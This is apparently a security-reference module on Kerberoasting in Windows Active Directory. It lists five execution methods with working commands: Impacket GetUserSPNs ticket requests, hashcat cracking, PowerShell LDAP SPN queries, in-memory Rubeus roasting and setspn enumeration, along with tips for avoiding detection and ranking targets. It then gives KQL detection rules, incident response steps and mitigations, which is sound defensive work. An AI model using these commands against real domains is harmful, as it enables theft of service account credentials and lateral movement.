# REC-AD-004: SPN Scanning for Kerberoastable Accounts

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-004 |
| **Technique Name** | SPN scanning for kerberoastable accounts |
| **MITRE ATT&CK ID** | T1087.002 – Account Discovery: Domain Account; T1558.003 – Steal or Forge Kerberos Tickets: Kerberoastable Accounts |
| **CVE** | N/A (Design feature; weak passwords enable exploitation) |
| **Platform** | Windows Active Directory / On-Premises |
| **Viability Status** | ACTIVE ✓ (No patching possible; requires operational changes) |
| **Difficulty to Detect** | MEDIUM (Event ID 4769 noisy; requires baselining) |
| **Requires Authentication** | Yes (Valid domain user required) |
| **Applicable Versions** | All Windows AD domains |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Service Principal Name (SPN) scanning identifies Active Directory service accounts vulnerable to Kerberoasting—a post-authentication attack enabling offline password cracking of service account credentials. Kerberoastable accounts are those with registered SPNs (SQL Server, IIS, SharePoint, Exchange, etc.) often running elevated-privilege services. Unlike patch-based vulnerabilities, Kerberoasting exploits fundamental Kerberos authentication protocol design: any authenticated domain user can request service tickets encrypted with target service account passwords, which can then be cracked offline using dictionary attacks or GPU-accelerated hashcat.

**Critical Threat Characteristics:**
- **No privilege escalation required**: Any valid domain user (intern → global admin) can request TGS tickets
- **Offline cracking**: Once TGS ticket obtained, cracking can occur offline, invisible to AD monitoring
- **Weak passwords**: Service accounts often have non-rotated or weak passwords (set years ago)
- **High-value targets**: Service accounts often run critical services with elevated privileges
- **RC4 encryption weakness**: Legacy RC4-encrypted tickets crack in minutes/hours (AES harder but still crackable)
- **Post-breach persistence**: Kerberoasting provides credential access for long-term lateral movement

**Real-World Impact:**
- Service account compromise enables lateral movement across dependent systems
- SQL Server accounts grant database access (sensitive data exposure)
- Exchange service accounts enable email exfiltration
- Backup service accounts grant domain controller access
- IIS web server accounts grant web application compromise

---

## 3. EXECUTION METHODS

### Method 1: Enumeration via Impacket GetUserSPNs

**Objective:** Discover kerberoastable service accounts; request TGS tickets for offline cracking.

```bash
# Step 1: Verify domain user credentials
# (Valid domain user required; no privilege escalation needed)

# Step 2: Enumerate kerberoastable accounts via LDAP
python3 -m impacket.examples.GetUserSPNs \
  -request \
  -dc-ip 192.168.1.100 \
  DOMAIN.LOCAL/username:password

# Output: List of all kerberoastable accounts
# Example:
# ServicePrincipalName  Name                     MemberOf
# MSSQLSvc/sql01.domain.local:1433  sql_service  CN=Domain Admins,CN=Users,DC=domain,DC=local
# HTTP/webserver.domain.local       web_service  CN=Service Accounts,CN=Users,DC=domain,DC=local

# Step 3: Capture TGS tickets (included in above command)
# Tickets saved in Kerberos compatible format

# Step 4: Crack offline with hashcat
hashcat -m 13100 tickets.txt wordlist.txt --rules-file OneRuleToRuleThemAll.rule

# Step 5: Attempt to crack with GPU acceleration
# SQL service accounts: 5-10 minutes (weak password)
# Exchange service: 30 minutes (complex password)
# Domain admin accounts: May take hours/days if complex

# Result: Service account plaintext password
```

### Method 2: LDAP Query for SPN Enumeration

**Objective:** Direct LDAP query to identify SPNs without requesting tickets (lower detection risk).

```powershell
# Step 1: Search AD for user accounts with SPNs
# (No TGS request; less detectable)

$filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($filter)
$searcher.PropertiesToLoad.AddRange(@("samAccountName","servicePrincipalName","userAccountControl"))

$results = $searcher.FindAll()

foreach ($result in $results) {
  $user = $result.Properties["samAccountName"][0]
  $spns = $result.Properties["servicePrincipalName"]
  
  Write-Host "User: $user"
  foreach ($spn in $spns) {
    Write-Host "  SPN: $spn"
  }
}

# Output: All users with SPNs (enumeration phase)
# No tickets requested; only LDAP queries (still generates Event ID 1644 in audit)
```

### Method 3: Rubeus Kerberoasting (In-Memory)

**Objective:** In-memory Kerberoasting using Rubeus (avoids disk artifacts).

```powershell
# Step 1: Download Rubeus (or compile from source)
# Rubeus is .NET tool; runs in PowerShell context

# Step 2: Enumerate and roast all kerberoastable accounts
.\Rubeus.exe kerberoast /stats

# Output: Statistics on kerberoastable accounts
# Example:
# Kerberoastable Users (stats):
# SQL Service Accounts: 5
# IIS Web Services: 3
# Exchange Services: 2
# Backup Services: 1

# Step 3: Request TGS tickets for all SPNs
.\Rubeus.exe kerberoast /nowrap

# Output: TGS tickets in hashcat format
# Tickets in memory; never written to disk
# Can be piped directly to hashcat for cracking

# Step 4: Optional - Target specific users for lower detection
.\Rubeus.exe kerberoast /user:sql_service /nowrap

# Result: Service account ticket for offline cracking
```

### Method 4: setspn.exe (Living off the Land)

**Objective:** Use Windows native tool to enumerate SPNs (minimal detection).

```cmd
# Step 1: Run setspn.exe to query SPNs
setspn -Q */*

# Output: All SPNs in domain
# Example:
# Checking domain DC=domain,DC=local
# 
# MSSQLSvc/sql01.domain.local:1433  sql_service
# HTTP/webserver.domain.local  web_service
# HOST/fileserver.domain.local  file_service

# Step 2: Identify vulnerable SPNs (non-domain accounts, no $ in name)
setspn -T domain -F -Q */*

# Step 3: Filter for user accounts (exclude machine accounts ending in $)
# User accounts with SPNs = kerberoastable

# OPSEC Advantage: setspn.exe is built-in Windows tool
# No tool download required; blends with normal activity
```

### Method 5: Detect Weak Password Service Accounts (Pre-Crack Reconnaissance)

**Objective:** Identify which kerberoastable accounts likely have weak passwords.

```powershell
# Step 1: Query for service accounts with suspicious characteristics
$filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(|(userAccountControl:1.2.840.113556.1.4.803:=65536)(pwdLastSet>=`"$((Get-Date).AddDays(-365).ToString('yyyyMMddhhmmss.0Z'))`")))"

# Filters:
# - userAccountControl 65536 = Password Never Expires (HIGH RISK)
# - pwdLastSet >1 year = Not rotated (HIGH RISK)

# Step 2: Query for RC4 encryption preference
# (RC4 = weakest Kerberos encryption; cracks fastest)

# Get DomainPolicy to check encryption settings
$domain = Get-ADDomain
$policy = Get-ADObject -Identity $domain.DomainSID -Properties msDS-SupportedEncryptionTypes

# Step 3: Prioritize targets
# Priority 1: Password never expires + Domain Admin group
# Priority 2: Not rotated >1 year + Service account OU
# Priority 3: RC4-only encryption

# Step 4: Estimate crack time
# RC4 + weak password: 5-30 minutes (GPU)
# RC4 + medium password: 1-4 hours
# AES + weak password: 2-8 hours
# AES + medium password: 1-3 days

# Result: Prioritized list of high-value, likely-crackable accounts
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Rule: Event ID 4769 Baseline Anomaly

```kusto
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"  // RC4-HMAC
| where TicketOptions == "0x40810000"   // TGS-REQ flags
| where Status == "0x0"                  // Success
| extend ServiceName = tolower(ServiceName)
| where ServiceName !contains "$" and ServiceName !contains "krbtgt"
| summarize RequestCount = count(), DistinctServices = dcount(ServiceName)
  by Account, Computer, bin(TimeGenerated, 5m)
| where RequestCount > 15 or DistinctServices > 10  // Bulk TGS requests
| extend AlertSeverity = "High"
```

### Detection Rule: LDAP SPN Enumeration Query

```kusto
SecurityEvent
| where EventID == 1644  // LDAP query
| where EventData contains "servicePrincipalName=*"
| where EventData contains "samAccountType=805306368"  // User objects
| extend QueryUser = Account
| summarize QueryCount = count()
  by QueryUser, Computer, bin(TimeGenerated, 1h)
| where QueryCount > 1  // Multiple SPN queries in hour
| extend AlertSeverity = "Medium", Pattern = "Potential SPN enumeration"
```

### Incident Response Steps

1. **Identify compromised TGS ticket request**: Review Event ID 4769 logs
2. **Extract affected service accounts**: Parse EventData for TargetUserName
3. **Reset service account passwords**: Immediate remediation
4. **Identify running services**: Determine which applications/services use affected accounts
5. **Restart affected services**: With new password
6. **Check lateral movement**: Review service account activity post-compromise
7. **Enable monitoring**: Deploy honeypot SPN accounts

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Use Managed Service Accounts (gMSA/dMSA)**
  - Managed by AD; automatic password rotation (30 days)
  - Kerberoasting passwords crack slowly (complex, random, rotated frequently)
  - Eliminates human error in password management

- **Remove SPNs from User Accounts**
  - SPNs should only exist on dedicated service accounts
  - Never assign SPNs to domain admin accounts
  - Regularly audit SPN assignments

- **Enforce Strong Passwords + Rotation**
  - Service account passwords: minimum 25 characters, changed every 90 days
  - Document password management (secret vault, automation)
  - Prohibit "password never expires" flag

**Priority 2: HIGH**

- **Monitor TGS Requests**
  - Establish baseline: normal TGS request patterns
  - Alert on anomalies: single user requesting >10 distinct SPNs
  - Use honeypot SPNs to detect Kerberoasting

- **Enable Kerberos Audit Logging**
  - Event ID 4769 (TGS request) and Event ID 4770 (TGS renewal)
  - Forward to SIEM for correlation
  - Reduce noise via filtering known legitimate patterns

- **Implement Conditional Access (if Hybrid)**
  - Restrict Kerberos ticket requests from risky IPs
  - Require MFA for service accounts (if applicable)
  - Monitor service account sign-ins

---

## 6. TOOL REFERENCE

| Tool | Purpose | Detection Risk | OPSEC |
|------|---------|----------------|-------|
| **GetUserSPNs** | Enumerate + request TGS | MEDIUM (Event 4769) | Tool requires download |
| **Rubeus** | In-memory roasting | MEDIUM (4769) | In-memory; no disk artifacts |
| **setspn.exe** | Native enumeration | LOW (tool is built-in) | Blends with normal activity |
| **PowerShell LDAP** | Query enumeration | MEDIUM (Event 1644) | Native PS; no tool download |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1087.002 (Account Discovery: Domain Account)
- MITRE T1558.003 (Steal or Forge Kerberos Tickets: Kerberoastable Accounts)
- CIS Controls v8: 5.3 (Account Access Management)
- NIST 800-53: AC-2 (Account Management), IA-5 (Password Management)

---
